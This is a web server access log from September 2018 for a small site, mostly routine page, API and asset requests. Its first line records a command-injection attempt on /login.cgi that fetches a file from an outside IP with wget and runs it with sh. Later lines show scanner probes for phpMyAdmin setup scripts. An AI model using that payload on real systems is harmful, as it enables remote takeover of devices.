188.19.235.83 - - [01/Sep/2018:20:06:15 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://77.73.69.246/dl%20-O%20-%3E%20/tmp/.shinka2;sh%20/tmp/.shinka2%27$ HTTP/1.1" 400 173 "-" "Shinka/2.0" "-"
172.31.23.250 - - [11/Sep/2018:16:42:14 +0000] "GET /favicon.ico HTTP/1.1" 404 136 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:16:42:18 +0000] "GET /favicon.ico HTTP/1.1" 404 136 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:16:43:13 +0000] "GET /api/hello HTTP/1.1" 200 58 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "15.65.252.14"
172.31.23.250 - - [11/Sep/2018:16:43:13 +0000] "GET /api/hello HTTP/1.1" 200 32 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "199.116.173.196"
172.31.23.250 - - [11/Sep/2018:16:43:15 +0000] "GET /favicon.ico HTTP/1.1" 404 136 "http://eyeofhorus.codigoaberto.io/api/hello" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "15.65.252.14"
172.31.13.179 - - [11/Sep/2018:16:43:15 +0000] "GET / HTTP/1.1" 404 136 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "199.116.173.196"
172.31.23.250 - - [11/Sep/2018:16:43:32 +0000] "GET /api/hello HTTP/1.1" 200 58 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "15.65.244.24, 165.225.48.72"
172.31.23.250 - - [11/Sep/2018:16:43:36 +0000] "GET / HTTP/1.1" 404 136 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "15.65.244.24, 165.225.48.72"
172.31.23.250 - - [11/Sep/2018:16:43:59 +0000] "GET /images HTTP/1.1" 404 136 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "15.65.244.24, 165.225.48.72"
172.31.23.250 - - [11/Sep/2018:16:45:36 +0000] "GET / HTTP/1.1" 404 136 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:16:57:58 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 136 "-" "Mozilla/5.0" "95.181.179.253"
172.31.23.250 - - [11/Sep/2018:17:32:09 +0000] "GET /js/czjl.js HTTP/1.1" 404 136 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36 QQBrowser/4.3.4986.400" "45.77.175.207"
172.31.13.179 - - [11/Sep/2018:17:41:54 +0000] "GET / HTTP/1.1" 404 136 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" "189.31.188.70"
172.31.23.250 - - [11/Sep/2018:17:49:46 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 136 "-" "Mozilla/5.0" "63.246.129.30"
172.31.23.250 - - [11/Sep/2018:17:52:38 +0000] "GET / HTTP/1.1" 404 136 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "121.52.142.49"
172.31.23.250 - - [11/Sep/2018:17:58:22 +0000] "GET / HTTP/1.1" 404 136 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" "185.74.194.70"
172.31.23.250 - - [11/Sep/2018:18:39:56 +0000] "GET / HTTP/1.1" 404 136 "-" "Mozilla/5.0" "172.104.108.109"
172.31.23.250 - - [11/Sep/2018:18:51:48 +0000] "GET /js/czjl.js HTTP/1.1" 404 136 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36 QQBrowser/4.3.4986.400" "45.77.175.207"
172.31.13.179 - - [11/Sep/2018:18:54:08 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "15.65.252.14"
172.31.13.179 - - [11/Sep/2018:18:54:08 +0000] "GET /service-worker.js HTTP/1.1" 200 659 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "15.65.252.14"
172.31.13.179 - - [11/Sep/2018:18:54:09 +0000] "GET /precache-manifest.287640d19d55e64afb45ab92e273915c.js HTTP/1.1" 200 233 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "15.65.252.14"
172.31.13.179 - - [11/Sep/2018:18:54:10 +0000] "GET /bundle.js HTTP/1.1" 200 82288 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "15.65.252.14"
172.31.13.179 - - [11/Sep/2018:18:54:16 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "15.65.252.14"
172.31.13.179 - - [11/Sep/2018:18:54:16 +0000] "GET /favicon.ico HTTP/1.1" 404 136 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "15.65.252.14"
172.31.13.179 - - [11/Sep/2018:18:54:17 +0000] "GET /service-worker.js HTTP/1.1" 200 659 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "15.65.252.14"
172.31.13.179 - - [11/Sep/2018:18:54:36 +0000] "GET / HTTP/1.1" 404 136 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:18:56:26 +0000] "GET / HTTP/1.1" 404 136 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:18:56:30 +0000] "GET / HTTP/1.1" 404 136 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:18:58:10 +0000] "GET / HTTP/1.1" 200 593 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:18:58:10 +0000] "GET /bundle.js HTTP/1.1" 200 82280 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:18:58:15 +0000] "GET /api/hello HTTP/1.1" 200 58 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:18:58:15 +0000] "GET /2c3b51142672cfdd122ae499a725ae03.svg HTTP/1.1" 200 1941 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:18:58:15 +0000] "GET /1.jpg HTTP/1.1" 200 14566 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:18:58:15 +0000] "GET /2.jpg HTTP/1.1" 200 14566 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:18:58:15 +0000] "GET /3.jpg HTTP/1.1" 200 14566 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:18:58:16 +0000] "GET /service-worker.js HTTP/1.1" 200 658 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:18:58:18 +0000] "GET /precache-manifest.9c41e13d723d934762ea5672416742f6.js HTTP/1.1" 200 233 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:18:58:20 +0000] "GET /manifest.fbdb4ac39e68880df733a90c1db0fcd5.json HTTP/1.1" 200 445 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:18:58:20 +0000] "GET /index.html HTTP/1.1" 200 593 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:18:58:20 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:18:58:20 +0000] "GET /bundle.js HTTP/1.1" 200 82280 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "165.225.48.72"
172.31.23.250 - - [11/Sep/2018:19:04:23 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.23.250 - - [11/Sep/2018:19:04:24 +0000] "GET /service-worker.js HTTP/1.1" 200 658 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.23.250 - - [11/Sep/2018:19:04:29 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.23.250 - - [11/Sep/2018:19:04:29 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.23.250 - - [11/Sep/2018:19:04:31 +0000] "GET /service-worker.js HTTP/1.1" 200 658 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.23.250 - - [11/Sep/2018:19:10:18 +0000] "GET / HTTP/1.1" 200 593 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36" "71.6.232.7"
172.31.13.179 - - [11/Sep/2018:19:11:23 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.13.179 - - [11/Sep/2018:19:11:23 +0000] "GET /service-worker.js HTTP/1.1" 200 658 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.23.250 - - [11/Sep/2018:19:12:34 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.23.250 - - [11/Sep/2018:19:12:34 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.23.250 - - [11/Sep/2018:19:12:34 +0000] "GET /service-worker.js HTTP/1.1" 200 658 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.23.250 - - [11/Sep/2018:19:12:35 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.23.250 - - [11/Sep/2018:19:12:35 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.23.250 - - [11/Sep/2018:19:12:37 +0000] "GET /service-worker.js HTTP/1.1" 200 658 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.23.250 - - [11/Sep/2018:19:12:47 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.23.250 - - [11/Sep/2018:19:12:47 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.23.250 - - [11/Sep/2018:19:12:48 +0000] "GET /service-worker.js HTTP/1.1" 200 658 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.23.250 - - [11/Sep/2018:19:13:14 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.23.250 - - [11/Sep/2018:19:13:14 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.23.250 - - [11/Sep/2018:19:13:15 +0000] "GET /service-worker.js HTTP/1.1" 200 658 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.23.250 - - [11/Sep/2018:19:13:16 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.23.250 - - [11/Sep/2018:19:13:16 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.23.250 - - [11/Sep/2018:19:13:18 +0000] "GET /service-worker.js HTTP/1.1" 200 658 "https://eyeofhorus.codigoaberto.io/service-worker.js" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.23.250 - - [11/Sep/2018:19:19:05 +0000] "GET / HTTP/1.1" 200 593 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" "15.65.252.14, 66.249.88.161"
172.31.13.179 - - [11/Sep/2018:19:19:05 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" "15.65.252.14, 66.249.88.173"
172.31.23.250 - - [11/Sep/2018:19:28:28 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" "103.251.248.125"
172.31.23.250 - - [11/Sep/2018:19:46:20 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "187.75.115.87"
172.31.23.250 - - [11/Sep/2018:20:03:02 +0000] "GET / HTTP/1.1" 200 593 "http://www.google.com/search" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36" "15.65.252.14, 66.102.6.170"
172.31.13.179 - - [11/Sep/2018:20:03:02 +0000] "GET / HTTP/1.1" 200 593 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" "15.65.252.14, 66.249.88.168"
172.31.23.250 - - [11/Sep/2018:20:03:02 +0000] "GET /bundle.js HTTP/1.1" 200 82280 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36" "15.65.252.14, 66.102.6.172"
172.31.13.179 - - [11/Sep/2018:20:03:03 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" "15.65.252.14, 66.249.88.168"
172.31.23.250 - - [11/Sep/2018:20:03:03 +0000] "GET /api/hello HTTP/1.1" 200 58 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36" "15.65.252.14, 66.102.6.172"
172.31.23.250 - - [11/Sep/2018:20:03:03 +0000] "GET /2c3b51142672cfdd122ae499a725ae03.svg HTTP/1.1" 200 1941 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36" "15.65.252.14, 66.102.6.170"
172.31.23.250 - - [11/Sep/2018:20:03:03 +0000] "GET /1.jpg HTTP/1.1" 200 14566 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36" "15.65.252.14, 66.102.6.172"
172.31.23.250 - - [11/Sep/2018:20:03:03 +0000] "GET /3.jpg HTTP/1.1" 200 14566 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36" "15.65.252.14, 66.102.6.174"
172.31.23.250 - - [11/Sep/2018:20:03:03 +0000] "GET /2.jpg HTTP/1.1" 200 14566 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36" "15.65.252.14, 66.102.6.170"
172.31.13.179 - - [11/Sep/2018:20:05:54 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.13.179 - - [11/Sep/2018:20:05:54 +0000] "GET /api/hello HTTP/1.1" 304 0 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.13.179 - - [11/Sep/2018:20:05:55 +0000] "GET /favicon.ico HTTP/1.1" 200 3870 "https://eyeofhorus.codigoaberto.io/" "Mozilla/5.0 (Linux; Android 7.1.1; Moto G (5S) Build/NPPS26.102-49-11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.91 Mobile Safari/537.36" "187.26.206.207"
172.31.23.250 - - [11/Sep/2018:20:08:05 +0000] "GET / HTTP/1.1" 404 136 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "15.65.252.14"
172.31.23.250 - - [11/Sep/2018:20:08:05 +0000] "GET / HTTP/1.1" 404 136 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "199.116.173.196"
172.31.23.250 - - [11/Sep/2018:20:08:07 +0000] "GET /favicon.ico HTTP/1.1" 404 149 "http://eye-of-horus.us-west-2.elasticbeanstalk.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "15.65.252.14"
172.31.23.250 - - [11/Sep/2018:20:08:12 +0000] "GET /js/czjl.js HTTP/1.1" 404 149 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.101 Safari/537.36 QQBrowser/4.3.4986.400" "45.77.175.207"
172.31.23.250 - - [11/Sep/2018:20:10:52 +0000] "GET / HTTP/1.1" 404 136 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" "15.65.252.14"
172.31.13.179 - - [11/Sep/2018:20:21:29 +0000] "GET / HTTP/1.1" 404 136 "-" "Mozilla/5.0(WindowsNT6.1;rv:31.0)Gecko/20100101Firefox/31.0" "196.52.43.125"
